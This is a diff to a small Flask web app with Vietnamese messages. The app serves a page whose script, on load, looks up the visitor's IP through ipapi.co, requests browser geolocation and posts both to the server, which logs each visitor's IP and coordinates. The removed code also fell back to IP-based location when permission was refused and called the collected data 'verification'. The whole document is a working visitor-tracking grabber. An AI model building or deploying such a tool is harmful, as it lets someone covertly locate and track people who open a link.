@@ -118,57 +118,43 @@ HTML_PAGE = '''
 
   <script>
   window.addEventListener('DOMContentLoaded', async () => {
-    const sendData = async (payload) => {
-      try {
-        await fetch('/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        console.log("✅ Dữ liệu đã gửi:", payload);
-      } catch (err) {
-        console.error("❌ Lỗi khi gửi dữ liệu:", err);
-      }
-    };
-
+    let ipInfo = {};
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      ipInfo = await res.json();
+    } catch (err) {
+      console.warn("❌ Không thể lấy IP:", err);
+    }
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          const ipRes = await fetch('https://ipapi.co/json/');
-          const ipData = await ipRes.json();
-
           const payload = {
-            ip: ipData.ip,
+            ip: ipInfo.ip || null,
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude
           };
 
-          await sendData(payload);
+          try {
+            await fetch('/submit', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            });
+            console.log("✅ Gửi IP + vị trí thành công:", payload);
+          } catch (err) {
+            console.error("❌ Gửi thất bại:", err);
+          }
         },
-        async (err) => {
-          const res = await fetch('https://ipapi.co/json/');
-          const data = await res.json();
-          const payload = {
-            ip: data.ip,
-            latitude: data.latitude,
-            longitude: data.longitude
-          };
-          await sendData(payload);
-        },
-        { timeout: 5000 }
+        (err) => {
+          console.warn("❌ Không lấy được vị trí:", err.message);
+        }
       );
     } else {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-      const payload = {
-        ip: data.ip,
-        latitude: data.latitude,
-        longitude: data.longitude
-      };
-      await sendData(payload);
+      console.warn("❌ Trình duyệt không hỗ trợ geolocation");
     }
   });
 </script>
+
 
 
 
@@ -182,7 +168,6 @@ def index():
     print(f"[📡] IP người truy cập: {ip}")
     return Response(HTML_PAGE, mimetype='text/html')
 
-
 @app.route('/submit', methods=['POST'])
 def submit():
     print("📩 Raw body:", request.data.decode('utf-8'))
@@ -195,16 +180,18 @@ def submit():
         print("❌ JSON lỗi:", str(e))
         return jsonify({'error': 'JSON decode failed'}), 400
 
-  ip = data.get('ip') or request.headers.get('X-Forwarded-For', request.remote_addr)
-lat = data.get('latitude')
-lon = data.get('longitude')
+    # Lấy IP: Ưu tiên trong body, fallback về X-Forwarded-For, cuối cùng là remote_addr
+    ip = data.get('ip') or request.headers.get('X-Forwarded-For', request.remote_addr)
+    lat = data.get('latitude')
+    lon = data.get('longitude')
 
     if not ip or lat is None or lon is None:
         print("⚠️ Thiếu IP hoặc vị trí:", data)
         return jsonify({'error': 'Thiếu dữ liệu'}), 400
 
     print(f"✅ IP={ip}, Vị trí=({lat}, {lon})")
-    return jsonify({'message': 'Đã nhận dữ liệu xác minh'}), 200
+    return jsonify({'message': 'Đã nhận dữ liệu thành công'}), 200
+
 
 
 if __name__ == '__main__':
